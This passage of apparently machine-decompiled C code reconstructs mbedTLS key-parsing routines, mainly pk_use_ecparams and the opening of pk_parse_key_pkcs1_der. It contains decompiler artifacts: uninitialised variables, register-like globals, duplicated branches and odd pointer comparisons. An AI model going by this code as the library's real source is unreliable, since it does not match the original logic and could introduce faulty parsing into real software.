                    g7 = v2;
                    g5 = v4;
                    return -0x3a80;
                }
            }
            // 0x804dc2a
            if (*(int32_t *)(g3 + 4) == 0) {
                // 0x804dc30
                result = 0;
                // branch -> 0x804dbe8
            } else {
                // 0x804dc23
                result = -0x3a80;
                // branch -> 0x804dbe8
            }
            // 0x804dbe8
            g3 = v1;
            g7 = v2;
            g5 = v4;
            return result;
        }
        result = -0x3c80;
    } else {
        // 0x804dbe3
        result = v5 - 0x3a80;
        // branch -> 0x804dbe8
    }
    // 0x804dbe8
    g3 = v1;
    g7 = v2;
    g5 = v4;
    return result;
}

// Address range: 0x804dc40 - 0x804e1ff
int32_t pk_use_ecparams(int32_t a1, int32_t a2) {
    int32_t v1 = g5; // 0x804dc43
    int32_t v2 = g7; // 0x804dc44
    int32_t v3 = g3; // 0x804dc45
    int32_t v4 = g1; // 0x804dc46
    g3 = v4;
    int32_t v5 = g6; // 0x804dc51
    int32_t result2; // 0x804dcbd_2
    int32_t v6;
    if (*(int32_t *)v4 == 6) {
        // 0x804e047
        mbedtls_oid_get_ec_grp(v4, &v6);
        result2 = -0x3a00;
        // branch -> 0x804dcb3
    } else {
        // 0x804dc5d
        int32_t v7;
        g5 = &v7;
        mbedtls_ecp_group_init((char *)&v7);
        int32_t v8 = g3; // 0x804dc6b
        int32_t v9 = *(int32_t *)(v8 + 8); // 0x804dc6b
        int32_t v10 = v9;
        int32_t v11 = *(int32_t *)(v8 + 4) + v9; // 0x804dc74
        g7 = v11;
        g3 = &v10;
        int32_t v12;
        int32_t v13 = mbedtls_asn1_get_int(&v10, v11, &v12); // 0x804dc85
        int32_t v14; // 0x804e1af62
        int32_t v15; // 0x804e0bb64
        int32_t * v16; // 0x804dfa8_0
        int32_t * v17; // 0x804dfd9_0
        int32_t v18; // 0x804de8e
        int32_t result; // 0x804dfef
        int32_t v19; // 0x804e13674
        int32_t v20;
        int32_t v21;
        int32_t v22;
        int32_t v23; // 0x804de85
        int32_t v24; // 0x804dfd9
        int32_t v25; // 0x804dfb2
        int32_t v26; // 0x804dfb7
        int32_t v27; // 0x804e0f966
        int32_t v28; // 0x804e13e69
        int32_t v29; // 0x804e13e72
        int32_t v30; // 0x804dea676
        int32_t v31; // 0x804dfdf
        int32_t result3; // 0x804dc92
        if (v13 == 0) {
            // 0x804e032
            int32_t result4; // 0x804dc9f
            if (v12 < 4) {
                // 0x804e06a
                int32_t v32;
                int32_t v33 = &v32; // 0x804e06a_0
                int32_t v34 = mbedtls_asn1_get_tag((int32_t *)g3, g7, v33, 48); // 0x804e080
                g1 = v34;
                if (v34 == 0) {
                    int32_t v35 = v32 + v10; // 0x804e0a4
                    int32_t v36 = mbedtls_asn1_get_tag((int32_t *)g3, v35, v33, 6); // 0x804e0bb
                    g1 = v36;
                    if (v36 == 0) {
                        // 0x804e0c8
                        if (v32 == 7) {
                            int32_t str = v10; // 0x804e0d8
                            if (memcmp((char *)str, (char *)&g20, 7) == 0) {
                                // 0x804e103
                                int32_t v37;
                                int32_t v38 = &v37; // 0x804e103_0
                                v10 = str + 7;
                                int32_t v39 = mbedtls_asn1_get_mpi((int32_t *)g3, v35, v38); // 0x804e120
                                if (v39 != 0) {
                                    // 0x804dc92
                                    result3 = v39 - 0x3d00;
                                    g1 = result3;
                                    if (result3 == 0) {
                                        v30 = v21;
                                        v19 = v22;
                                        v29 = v35;
                                        v14 = v38;
                                        v27 = str;
                                        v15 = 6;
                                        // 0x804de50
                                        g7 = &v20;
                                        mbedtls_ecp_group_init((char *)&v20);
                                        mbedtls_ecp_grp_id_list();
                                        g1 = &g217;
                                        g3 = &g217;
                                        if (g217 == 0) {
                                            // 0x804dfa0
                                            mbedtls_ecp_group_free((char *)g7);
                                            v16 = (int32_t *)g3;
                                            v6 = *v16;
                                            v25 = *v16 == 0 ? -0x4e80 : 0;
                                            g1 = v25;
                                            v26 = v25;
                                            // branch -> 0x804dfb7
                                        } else {
                                            // 0x804de7d
                                            v28 = v29;
                                            // branch -> 0x804de7d
                                            while (true) {
                                                // 0x804de7d
                                                mbedtls_ecp_group_free((char *)g7);
                                                v23 = *(int32_t *)g3;
                                                g1 = v23;
                                                v18 = mbedtls_ecp_group_load((int32_t *)g7, v23, v14, v15, 0, v27, v28, v5, 0);
                                                g1 = v18;
                                                if (v18 == 0) {
                                                    goto lab_0x804de9b_5;
                                                }
                                                // 0x804e000
                                                mbedtls_ecp_group_free((char *)g7);
                                                g1 = v18;
                                                v6 = *(int32_t *)g3;
                                                // branch -> 0x804dfb7
                                            }
                                        }
                                        // 0x804dfb7
                                        mbedtls_ecp_group_free((char *)g5);
                                        result2 = v26;
                                        if (v26 == 0) {
                                            // 0x804dfd3
                                            v17 = (int32_t *)v5;
                                            v24 = *v17;
                                            v31 = v6;
                                            g4 = v31;
                                            if (v24 == 0 || v24 == v31) {
                                                // 0x804dfe2
                                                g1 = v5;
                                                result = mbedtls_ecp_group_load(v17, v31, v14, v15, 0, 0, v29, v5, 0);
                                                g3 = v3;
                                                g7 = v2;
                                                g5 = v1;
                                                return result;
                                            }
                                            result2 = -0x3d00;
                                        }
                                        // 0x804dcb3
                                        g3 = v3;
                                        g7 = v2;
                                        g5 = v1;
                                        return result2;
                                    }
                                    // 0x804dc9f
                                    mbedtls_ecp_group_free((char *)g5);
                                    // branch -> 0x804dcb3
                                    // 0x804dcb3
                                    g3 = v3;
                                    g7 = v2;
                                    g5 = v1;
                                    return result3;
                                }
                                int32_t v40 = mbedtls_mpi_bitlen(v38, v35); // 0x804e136
                                if (v35 == v10) {
                                    int32_t v41 = mbedtls_asn1_get_tag((int32_t *)g3, g7, v33, 48); // 0x804dcd4
                                    g1 = v41;
                                    if (v41 == 0) {
                                        int32_t v42 = v32 + v10; // 0x804dcf4
                                        int32_t v43 = mbedtls_asn1_get_tag((int32_t *)g3, v42, v33, 4); // 0x804dd0b
                                        int32_t v44 = v43; // 0x804dc92
                                        int32_t v45 = v33; // 0x804e1af63
                                        if (v43 == 0) {
                                            int32_t v46 = v32; // 0x804dd18
                                            int32_t v47;
                                            int32_t v48 = mbedtls_mpi_read_binary((int32_t)&v47, (char *)v10, v46); // 0x804dd2f
                                            if (v48 == 0) {
                                                // 0x804dd3c
                                                v10 += v32;
                                                int32_t v49 = mbedtls_asn1_get_tag((int32_t *)g3, v42, v33, 4); // 0x804dd5e
                                                if (v49 == 0) {
                                                    int32_t v50 = v32; // 0x804dd6b
                                                    int32_t v51;
                                                    int32_t v52 = mbedtls_mpi_read_binary((int32_t)&v51, (char *)v10, v50); // 0x804dd82
                                                    if (v52 == 0) {
                                                        // 0x804dd8f
                                                        v10 += v32;
                                                        int32_t v53 = v10; // 0x804e157
                                                        int32_t v54 = v53; // 0x804ddc1
                                                        if (mbedtls_asn1_get_tag((int32_t *)g3, v42, v33, 3) == 0) {
                                                            int32_t v55 = v32 + v53; // 0x804e15a
                                                            v10 = v55;
                                                            v54 = v55;
                                                            // branch -> 0x804ddc1
                                                        }
                                                        // 0x804ddc1
                                                        if (v42 == v54) {
                                                            int32_t v56 = mbedtls_asn1_get_tag((int32_t *)g3, g7, v33, 4); // 0x804dde3
                                                            if (v56 == 0) {
                                                                int32_t v57 = v32; // 0x804ddf0
                                                                int32_t v58;
                                                                int32_t v59 = &v58; // 0x804de01_0
                                                                int32_t v60 = mbedtls_ecp_point_read_binary(g5, v59, (char *)v10, v57); // 0x804de08
                                                                int32_t v61; // 0x804de15_0
                                                                int32_t v62; // 0x804de2f
                                                                int32_t v63;
                                                                int32_t v64;
                                                                int32_t v65;
                                                                int32_t v66; // 0x804de28
                                                                if (v60 != 0) {
                                                                    // 0x804e165
                                                                    if (v60 == -0x4e80) {
                                                                        // 0x804e170
                                                                        if ((char)((int32_t)*(char *)v10 - 2) <= 1) {
                                                                            int32_t v67 = mbedtls_mpi_size(v38); // 0x804e18a
                                                                            int32_t v68;
                                                                            if ((int32_t)&v68 == v32) {
                                                                                // 0x804e19b
                                                                                if (mbedtls_mpi_read_binary(v59, (char *)(v10 + 1), v67) == 0) {
                                                                                    unsigned char v69 = *(char *)v10; // 0x804e1bf
                                                                                    if (mbedtls_mpi_lset((char *)&v64, (int32_t)v69 - 2) == 0) {
                                                                                        // 0x804e1dc
                                                                                        if (mbedtls_mpi_lset((char *)&v63, 1) == 0) {
                                                                                            // 0x804de15
                                                                                            v61 = &v65;
                                                                                            v10 += v32;
                                                                                            v66 = g7;
                                                                                            v62 = mbedtls_asn1_get_mpi((int32_t *)g3, v66, v61);
                                                                                            if (v62 == 0) {
                                                                                                // 0x804de42
                                                                                                v30 = mbedtls_mpi_bitlen(v61, v66);
                                                                                                v19 = v40;
                                                                                                v29 = v42;
                                                                                                v14 = v61;
                                                                                                v27 = v61;
                                                                                                v15 = v57;
                                                                                                // branch -> 0x804de50
                                                                                            } else {
                                                                                                // 0x804dc92
                                                                                                result3 = v62 - 0x3d00;
                                                                                                g1 = result3;
                                                                                                if (result3 != 0) {
                                                                                                    // 0x804dc9f
                                                                                                    mbedtls_ecp_group_free((char *)g5);
                                                                                                    // branch -> 0x804dcb3
                                                                                                    // 0x804dcb3
                                                                                                    g3 = v3;
                                                                                                    g7 = v2;
                                                                                                    g5 = v1;
                                                                                                    return result3;
                                                                                                }
                                                                                                v30 = v21;
                                                                                                v19 = v40;
                                                                                                v29 = v42;
                                                                                                v14 = v61;
                                                                                                v27 = v61;
                                                                                                v15 = v57;
                                                                                            }
                                                                                            // 0x804de50
                                                                                            g7 = &v20;
                                                                                            mbedtls_ecp_group_init((char *)&v20);
                                                                                            mbedtls_ecp_grp_id_list();
                                                                                            g1 = &g217;
                                                                                            g3 = &g217;
                                                                                            if (g217 == 0) {
                                                                                                // 0x804dfa0
                                                                                                mbedtls_ecp_group_free((char *)g7);
                                                                                                v16 = (int32_t *)g3;
                                                                                                v6 = *v16;
                                                                                                v25 = *v16 == 0 ? -0x4e80 : 0;
                                                                                                g1 = v25;
                                                                                                v26 = v25;
                                                                                                // branch -> 0x804dfb7
                                                                                            } else {
                                                                                                // 0x804de7d
                                                                                                v28 = v29;
                                                                                                // branch -> 0x804de7d
                                                                                                while (true) {
                                                                                                    // 0x804de7d
                                                                                                    mbedtls_ecp_group_free((char *)g7);
                                                                                                    v23 = *(int32_t *)g3;
                                                                                                    g1 = v23;
                                                                                                    v18 = mbedtls_ecp_group_load((int32_t *)g7, v23, v14, v15, 0, v27, v28, v5, 0);
                                                                                                    g1 = v18;
                                                                                                    if (v18 == 0) {
                                                                                                        goto lab_0x804de9b_5;
                                                                                                    }
                                                                                                    // 0x804e000
                                                                                                    mbedtls_ecp_group_free((char *)g7);
                                                                                                    g1 = v18;
                                                                                                    v6 = *(int32_t *)g3;
                                                                                                    // branch -> 0x804dfb7
                                                                                                }
                                                                                            }
                                                                                            // 0x804dfb7
                                                                                            mbedtls_ecp_group_free((char *)g5);
                                                                                            result2 = v26;
                                                                                            if (v26 == 0) {
                                                                                                // 0x804dfd3
                                                                                                v17 = (int32_t *)v5;
                                                                                                v24 = *v17;
                                                                                                v31 = v6;
                                                                                                g4 = v31;
                                                                                                if (v24 == 0 || v24 == v31) {
                                                                                                    // 0x804dfe2
                                                                                                    g1 = v5;
                                                                                                    result = mbedtls_ecp_group_load(v17, v31, v14, v15, 0, 0, v29, v5, 0);
                                                                                                    g3 = v3;
                                                                                                    g7 = v2;
                                                                                                    g5 = v1;
                                                                                                    return result;
                                                                                                }
                                                                                                result2 = -0x3d00;
                                                                                            }
                                                                                            // 0x804dcb3
                                                                                            g3 = v3;
                                                                                            g7 = v2;
                                                                                            g5 = v1;
                                                                                            return result2;
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                    // 0x804e03d
                                                                    g1 = -0x3d00;
                                                                    // branch -> 0x804dc9f
                                                                    // 0x804dc9f
                                                                    mbedtls_ecp_group_free((char *)g5);
                                                                    // branch -> 0x804dcb3
                                                                    // 0x804dcb3
                                                                    g3 = v3;
                                                                    g7 = v2;
                                                                    g5 = v1;
                                                                    return -0x3d00;
                                                                }
                                                                // 0x804de15
                                                                v61 = &v65;
                                                                v10 += v32;
                                                                v66 = g7;
                                                                v62 = mbedtls_asn1_get_mpi((int32_t *)g3, v66, v61);
                                                                if (v62 == 0) {
                                                                    // 0x804de42
                                                                    v30 = mbedtls_mpi_bitlen(v61, v66);
                                                                    v19 = v40;
                                                                    v29 = v42;
                                                                    v14 = v61;
                                                                    v27 = v61;
                                                                    v15 = v57;
                                                                    // branch -> 0x804de50
                                                                } else {
                                                                    // 0x804dc92
                                                                    result3 = v62 - 0x3d00;
                                                                    g1 = result3;
                                                                    if (result3 != 0) {
                                                                        // 0x804dc9f
                                                                        mbedtls_ecp_group_free((char *)g5);
                                                                        // branch -> 0x804dcb3
                                                                        // 0x804dcb3
                                                                        g3 = v3;
                                                                        g7 = v2;
                                                                        g5 = v1;
                                                                        return result3;
                                                                    }
                                                                    v30 = v21;
                                                                    v19 = v40;
                                                                    v29 = v42;
                                                                    v14 = v61;
                                                                    v27 = v61;
                                                                    v15 = v57;
                                                                }
                                                                // 0x804de50
                                                                g7 = &v20;
                                                                mbedtls_ecp_group_init((char *)&v20);
                                                                mbedtls_ecp_grp_id_list();
                                                                g1 = &g217;
                                                                g3 = &g217;
                                                                int32_t v70; // 0x804e13e68
                                                                if (g217 == 0) {
                                                                    // 0x804dfa0
                                                                    mbedtls_ecp_group_free((char *)g7);
                                                                    v16 = (int32_t *)g3;
                                                                    v6 = *v16;
                                                                    v25 = *v16 == 0 ? -0x4e80 : 0;
                                                                    g1 = v25;
                                                                    v26 = v25;
                                                                    v70 = v29;
                                                                    // branch -> 0x804dfb7
                                                                } else {
                                                                    // 0x804de7d
                                                                    v28 = v29;
                                                                    // branch -> 0x804de7d
                                                                    int32_t v71; // 0x804e13e70
                                                                    while (true) {
                                                                        // 0x804de7d
                                                                        mbedtls_ecp_group_free((char *)g7);
                                                                        v23 = *(int32_t *)g3;
                                                                        g1 = v23;
                                                                        v18 = mbedtls_ecp_group_load((int32_t *)g7, v23, v14, v15, 0, v27, v28, v5, 0);
                                                                        g1 = v18;
                                                                        if (v18 == 0) {
                                                                          lab_0x804de9b_5:
                                                                            // 0x804de9b
                                                                            v71 = v28;
                                                                            int32_t v72;
                                                                            if (v19 == v72) {
                                                                                // 0x804dea6
                                                                                int32_t v73;
                                                                                if (v30 == v73) {
                                                                                    // 0x804deb1
                                                                                    int32_t v74;
                                                                                    if (mbedtls_mpi_cmp_mpi(&v37, &v74) == 0) {
                                                                                        // 0x804decd
                                                                                        int32_t v75;
                                                                                        if (mbedtls_mpi_cmp_mpi(&v47, &v75) == 0) {
                                                                                            // 0x804dee9
                                                                                            int32_t v76;
                                                                                            if (mbedtls_mpi_cmp_mpi(&v51, &v76) == 0) {
                                                                                                // 0x804df09
                                                                                                int32_t v77;
                                                                                                if (mbedtls_mpi_cmp_mpi(&v65, &v77) == 0) {
                                                                                                    // 0x804df26
                                                                                                    int32_t v78;
                                                                                                    if (mbedtls_mpi_cmp_mpi(&v58, &v78) == 0) {
                                                                                                        // 0x804df43
                                                                                                        int32_t v79;
                                                                                                        if (mbedtls_mpi_cmp_mpi(&v63, &v79) == 0) {
                                                                                                            int32_t v80 = mbedtls_mpi_get_bit((int32_t)&v64, 0); // 0x804df6e
                                                                                                            int32_t v81;
                                                                                                            g1 = mbedtls_mpi_get_bit((int32_t)&v81, 0);
                                                                                                            if (v80 == 0) {
                                                                                                                // 0x804dfa0
                                                                                                                mbedtls_ecp_group_free((char *)g7);
                                                                                                                v16 = (int32_t *)g3;
                                                                                                                v6 = *v16;
                                                                                                                v25 = *v16 == 0 ? -0x4e80 : 0;
                                                                                                                g1 = v25;
                                                                                                                v26 = v25;
                                                                                                                // branch -> 0x804dfb7
                                                                                                                // 0x804dfb7
                                                                                                                mbedtls_ecp_group_free((char *)g5);
                                                                                                                result2 = v26;
                                                                                                                if (v26 == 0) {
                                                                                                                    // 0x804dfd3
                                                                                                                    v17 = (int32_t *)v5;
                                                                                                                    v24 = *v17;
                                                                                                                    v31 = v6;
                                                                                                                    g4 = v31;
                                                                                                                    if (v24 == 0 || v24 == v31) {
                                                                                                                        // 0x804dfe2
                                                                                                                        g1 = v5;
                                                                                                                        result = mbedtls_ecp_group_load(v17, v31, v14, v15, 0, 0, 0, v5, 0);
                                                                                                                        g3 = v3;
                                                                                                                        g7 = v2;
                                                                                                                        g5 = v1;
                                                                                                                        return result;
                                                                                                                    }
                                                                                                                    result2 = -0x3d00;
                                                                                                                }
                                                                                                                // 0x804dcb3
                                                                                                                g3 = v3;
                                                                                                                g7 = v2;
                                                                                                                g5 = v1;
                                                                                                                return result2;
                                                                                                            }
                                                                                                            v71 = v80;
                                                                                                        } else {
                                                                                                            v71 = v28;
                                                                                                        }
                                                                                                    } else {
                                                                                                        v71 = v28;
                                                                                                    }
                                                                                                } else {
                                                                                                    v71 = v28;
                                                                                                }
                                                                                            } else {
                                                                                                v71 = v28;
                                                                                            }
                                                                                        } else {
                                                                                            v71 = v28;
                                                                                        }
                                                                                    } else {
                                                                                        v71 = v28;
                                                                                    }
                                                                                } else {
                                                                                    v71 = v28;
                                                                                }
                                                                            }
                                                                            int32_t v82 = g3 + 4; // 0x804de70
                                                                            g3 = v82;
                                                                            int32_t v83 = *(int32_t *)v82; // 0x804de73
                                                                            g1 = v83;
                                                                            if (v83 == 0) {
                                                                                // break -> 0x804dfa0
                                                                                break;
                                                                            }
                                                                            v28 = v71;
                                                                            // continue -> 0x804de7d
                                                                            continue;
                                                                        } else {
                                                                            // 0x804e000
                                                                            mbedtls_ecp_group_free((char *)g7);
                                                                            g1 = v18;
                                                                            v6 = *(int32_t *)g3;
                                                                            v26 = v18;
                                                                            // branch -> 0x804dfb7
                                                                        }
                                                                        // 0x804dfb7
                                                                        mbedtls_ecp_group_free((char *)g5);
                                                                        result2 = v26;
                                                                        if (v26 == 0) {
                                                                            // 0x804dfd3
                                                                            v17 = (int32_t *)v5;
                                                                            v24 = *v17;
                                                                            v31 = v6;
                                                                            g4 = v31;
                                                                            if (v24 == 0 || v24 == v31) {
                                                                                // 0x804dfe2
                                                                                g1 = v5;
                                                                                result = mbedtls_ecp_group_load(v17, v31, v14, v15, 0, 0, v28, v5, 0);
                                                                                g3 = v3;
                                                                                g7 = v2;
                                                                                g5 = v1;
                                                                                return result;
                                                                            }
                                                                            result2 = -0x3d00;
                                                                        }
                                                                        // 0x804dcb3
                                                                        g3 = v3;
                                                                        g7 = v2;
                                                                        g5 = v1;
                                                                        return result2;
                                                                    }
                                                                    // 0x804dfa0
                                                                    mbedtls_ecp_group_free((char *)g7);
                                                                    v16 = (int32_t *)g3;
                                                                    v6 = *v16;
                                                                    v25 = *v16 == 0 ? -0x4e80 : 0;
                                                                    g1 = v25;
                                                                    v26 = v25;
                                                                    v70 = v71;
                                                                    // branch -> 0x804dfb7
                                                                }
                                                                // 0x804dfb7
                                                                mbedtls_ecp_group_free((char *)g5);
                                                                result2 = v26;
                                                                if (v26 == 0) {
                                                                    // 0x804dfd3
                                                                    v17 = (int32_t *)v5;
                                                                    v24 = *v17;
                                                                    v31 = v6;
                                                                    g4 = v31;
                                                                    if (v24 == 0 || v24 == v31) {
                                                                        // 0x804dfe2
                                                                        g1 = v5;
                                                                        result = mbedtls_ecp_group_load(v17, v31, v14, v15, 0, 0, v70, v5, 0);
                                                                        g3 = v3;
                                                                        g7 = v2;
                                                                        g5 = v1;
                                                                        return result;
                                                                    }
                                                                    result2 = -0x3d00;
                                                                }
                                                                // 0x804dcb3
                                                                g3 = v3;
                                                                g7 = v2;
                                                                g5 = v1;
                                                                return result2;
                                                            }
                                                            // 0x804dc92
                                                            result3 = v56 - 0x3d00;
                                                            g1 = result3;
                                                            if (result3 == 0) {
                                                                v30 = v21;
                                                                v19 = v40;
                                                                v29 = v42;
                                                                v14 = v33;
                                                                v27 = str;
                                                                v15 = 4;
                                                                // 0x804de50
                                                                g7 = &v20;
                                                                mbedtls_ecp_group_init((char *)&v20);
                                                                mbedtls_ecp_grp_id_list();
                                                                g1 = &g217;
                                                                g3 = &g217;
                                                                if (g217 == 0) {
                                                                    // 0x804dfa0
                                                                    mbedtls_ecp_group_free((char *)g7);
                                                                    v16 = (int32_t *)g3;
                                                                    v6 = *v16;
                                                                    v25 = *v16 == 0 ? -0x4e80 : 0;
                                                                    g1 = v25;
                                                                    v26 = v25;
                                                                    // branch -> 0x804dfb7
                                                                } else {
                                                                    // 0x804de7d
                                                                    v28 = v29;
                                                                    // branch -> 0x804de7d
                                                                    while (true) {
                                                                        // 0x804de7d
                                                                        mbedtls_ecp_group_free((char *)g7);
                                                                        v23 = *(int32_t *)g3;
                                                                        g1 = v23;
                                                                        v18 = mbedtls_ecp_group_load((int32_t *)g7, v23, v14, v15, 0, v27, v28, v5, 0);
                                                                        g1 = v18;
                                                                        if (v18 == 0) {
                                                                            goto lab_0x804de9b_5;
                                                                        }
                                                                        // 0x804e000
                                                                        mbedtls_ecp_group_free((char *)g7);
                                                                        g1 = v18;
                                                                        v6 = *(int32_t *)g3;
                                                                        // branch -> 0x804dfb7
                                                                    }
                                                                }
                                                                // 0x804dfb7
                                                                mbedtls_ecp_group_free((char *)g5);
                                                                result2 = v26;
                                                                if (v26 == 0) {
                                                                    // 0x804dfd3
                                                                    v17 = (int32_t *)v5;
                                                                    v24 = *v17;
                                                                    v31 = v6;
                                                                    g4 = v31;
                                                                    if (v24 == 0 || v24 == v31) {
                                                                        // 0x804dfe2
                                                                        g1 = v5;
                                                                        result = mbedtls_ecp_group_load(v17, v31, v14, v15, 0, 0, v29, v5, 0);
                                                                        g3 = v3;
                                                                        g7 = v2;
                                                                        g5 = v1;
                                                                        return result;
                                                                    }
                                                                    result2 = -0x3d00;
                                                                }
                                                                // 0x804dcb3
                                                                g3 = v3;
                                                                g7 = v2;
                                                                g5 = v1;
                                                                return result2;
                                                            }
                                                            result4 = result3;
                                                        } else {
                                                            // 0x804e14d
                                                            g1 = -0x3d66;
                                                            result4 = -0x3d66;
                                                            // branch -> 0x804dc9f
                                                        }
                                                        // 0x804dc9f
                                                        mbedtls_ecp_group_free((char *)g5);
                                                        // branch -> 0x804dcb3
                                                        // 0x804dcb3
                                                        g3 = v3;
                                                        g7 = v2;
                                                        g5 = v1;
                                                        return result4;
                                                    }
                                                    v44 = v52;
                                                    v45 = v50;
                                                } else {
                                                    v44 = v49;
                                                    v45 = v33;
                                                }
                                            } else {
                                                v44 = v48;
                                                v45 = v46;
                                            }
                                        }
                                        // 0x804dc92
                                        result3 = v44 - 0x3d00;
                                        g1 = result3;
                                        if (result3 == 0) {
                                            v30 = v21;
                                            v19 = v40;
                                            v29 = v42;
                                            v14 = v45;
                                            v27 = str;
                                            v15 = 4;
                                            // 0x804de50
                                            g7 = &v20;
                                            mbedtls_ecp_group_init((char *)&v20);
                                            mbedtls_ecp_grp_id_list();
                                            g1 = &g217;
                                            g3 = &g217;
                                            if (g217 == 0) {
                                                // 0x804dfa0
                                                mbedtls_ecp_group_free((char *)g7);
                                                v16 = (int32_t *)g3;
                                                v6 = *v16;
                                                v25 = *v16 == 0 ? -0x4e80 : 0;
                                                g1 = v25;
                                                v26 = v25;
                                                // branch -> 0x804dfb7
                                            } else {
                                                // 0x804de7d
                                                v28 = v29;
                                                // branch -> 0x804de7d
                                                while (true) {
                                                    // 0x804de7d
                                                    mbedtls_ecp_group_free((char *)g7);
                                                    v23 = *(int32_t *)g3;
                                                    g1 = v23;
                                                    v18 = mbedtls_ecp_group_load((int32_t *)g7, v23, v14, v15, 0, v27, v28, v5, 0);
                                                    g1 = v18;
                                                    if (v18 == 0) {
                                                        goto lab_0x804de9b_5;
                                                    }
                                                    // 0x804e000
                                                    mbedtls_ecp_group_free((char *)g7);
                                                    g1 = v18;
                                                    v6 = *(int32_t *)g3;
                                                    // branch -> 0x804dfb7
                                                }
                                            }
                                            // 0x804dfb7
                                            mbedtls_ecp_group_free((char *)g5);
                                            result2 = v26;
                                            if (v26 == 0) {
                                                // 0x804dfd3
                                                v17 = (int32_t *)v5;
                                                v24 = *v17;
                                                v31 = v6;
                                                g4 = v31;
                                                if (v24 == 0 || v24 == v31) {
                                                    // 0x804dfe2
                                                    g1 = v5;
                                                    result = mbedtls_ecp_group_load(v17, v31, v14, v15, 0, 0, v29, v5, 0);
                                                    g3 = v3;
                                                    g7 = v2;
                                                    g5 = v1;
                                                    return result;
                                                }
                                                result2 = -0x3d00;
                                            }
                                            // 0x804dcb3
                                            g3 = v3;
                                            g7 = v2;
                                            g5 = v1;
                                            return result2;
                                        }
                                        result4 = result3;
                                    } else {
                                        result4 = v41;
                                    }
                                } else {
                                    // 0x804e14d
                                    g1 = -0x3d66;
                                    result4 = -0x3d66;
                                    // branch -> 0x804dc9f
                                }
                                // 0x804dc9f
                                mbedtls_ecp_group_free((char *)g5);
                                // branch -> 0x804dcb3
                                // 0x804dcb3
                                g3 = v3;
                                g7 = v2;
                                g5 = v1;
                                return result4;
                            }
                        }
                        // 0x804e0ce
                        g1 = -0x3980;
                        result4 = -0x3980;
                        // branch -> 0x804dc9f
                    } else {
                        result4 = v36;
                    }
                } else {
                    result4 = v34;
                }
            } else {
                // 0x804e03d
                g1 = -0x3d00;
                result4 = -0x3d00;
                // branch -> 0x804dc9f
            }
            // 0x804dc9f
            mbedtls_ecp_group_free((char *)g5);
            // branch -> 0x804dcb3
            // 0x804dcb3
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return result4;
        }
        // 0x804dc92
        result3 = v13 - 0x3d00;
        g1 = result3;
        if (result3 == 0) {
            v30 = v21;
            v19 = v22;
            int32_t v84;
            v29 = v84;
            v14 = &v12;
            int32_t v85;
            v27 = v85;
            int32_t v86;
            v15 = v86;
            // 0x804de50
            g7 = &v20;
            mbedtls_ecp_group_init((char *)&v20);
            mbedtls_ecp_grp_id_list();
            g1 = &g217;
            g3 = &g217;
            if (g217 == 0) {
                // 0x804dfa0
                mbedtls_ecp_group_free((char *)g7);
                v16 = (int32_t *)g3;
                v6 = *v16;
                v25 = *v16 == 0 ? -0x4e80 : 0;
                g1 = v25;
                v26 = v25;
                // branch -> 0x804dfb7
            } else {
                // 0x804de7d
                v28 = v29;
                // branch -> 0x804de7d
                while (true) {
                    // 0x804de7d
                    mbedtls_ecp_group_free((char *)g7);
                    v23 = *(int32_t *)g3;
                    g1 = v23;
                    v18 = mbedtls_ecp_group_load((int32_t *)g7, v23, v14, v15, 0, v27, v28, v5, 0);
                    g1 = v18;
                    if (v18 == 0) {
                        goto lab_0x804de9b_5;
                    }
                    // 0x804e000
                    mbedtls_ecp_group_free((char *)g7);
                    g1 = v18;
                    v6 = *(int32_t *)g3;
                    // branch -> 0x804dfb7
                }
            }
            // 0x804dfb7
            mbedtls_ecp_group_free((char *)g5);
            result2 = v26;
            if (v26 == 0) {
                // 0x804dfd3
                v17 = (int32_t *)v5;
                v24 = *v17;
                v31 = v6;
                g4 = v31;
                if (v24 == 0 || v24 == v31) {
                    // 0x804dfe2
                    g1 = v5;
                    result = mbedtls_ecp_group_load(v17, v31, v14, v15, 0, 0, v29, v5, 0);
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return result;
                }
                result2 = -0x3d00;
            }
            // 0x804dcb3
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return result2;
        }
        // 0x804dc9f
        mbedtls_ecp_group_free((char *)g5);
        result2 = result3;
        // branch -> 0x804dcb3
    }
    // 0x804dcb3
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return result2;
}

// Address range: 0x804e200 - 0x804e38f
int32_t pk_parse_key_pkcs1_der(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x804e206
    g3 = g1;
    int32_t v2 = g7; // 0x804e20b
    int32_t v3 = g6; // 0x804e211
    int32_t v4 = v3; // bp-36
    g7 = &v4;
    int32_t v5 = g5; // 0x804e219
    int32_t v6;
    int32_t v7 = mbedtls_asn1_get_tag(&v4, g4 + v3, (int32_t)&v6, 48); // 0x804e22f
    int32_t v8 = v7; // 0x804e238
    int32_t v9;
    int32_t result2; // 0x804e238
    if (v7 == 0) {
        int32_t v10 = v6 + v4; // 0x804e253
        g5 = v10;
        int32_t v11 = mbedtls_asn1_get_int((int32_t *)g7, v10, (int32_t *)g3); // 0x804e261
        if (v11 == 0) {
            int32_t v12 = g3; // 0x804e26a
            int32_t v13 = *(int32_t *)v12; // 0x804e26a
            g4 = v13;
            g1 = -0x3d80;
            int32_t result = -0x3d80; // 0x804e249_2
            if (v13 == 0) {
                int32_t v14 = v12 + 8; // 0x804e275
                int32_t v15 = g5; // 0x804e27f
                int32_t v16 = mbedtls_asn1_get_mpi((int32_t *)g7, v15, v14); // 0x804e286
                int32_t v17 = v16; // 0x804e2a6
                if (v16 == 0) {
                    int32_t v18 = g5; // 0x804e296
                    int32_t v19 = mbedtls_asn1_get_mpi((int32_t *)g7, v18, g3 + 20); // 0x804e29d
                    if (v19 == 0) {
                        int32_t v20 = g5; // 0x804e2bd
                        int32_t v21 = mbedtls_asn1_get_mpi((int32_t *)g7, v20, g3 + 32); // 0x804e2c4
                        if (v21 == 0) {
                            int32_t v22 = g5; // 0x804e2d4
                            int32_t v23 = mbedtls_asn1_get_mpi((int32_t *)g7, v22, g3 + 44); // 0x804e2db
                            if (v23 == 0) {
                                int32_t v24 = g5; // 0x804e2eb
                                int32_t v25 = mbedtls_asn1_get_mpi((int32_t *)g7, v24, g3 + 56); // 0x804e2f2
                                if (v25 == 0) {
                                    int32_t v26 = g5; // 0x804e302
                                    int32_t v27 = mbedtls_asn1_get_mpi((int32_t *)g7, v26, g3 + 68); // 0x804e309
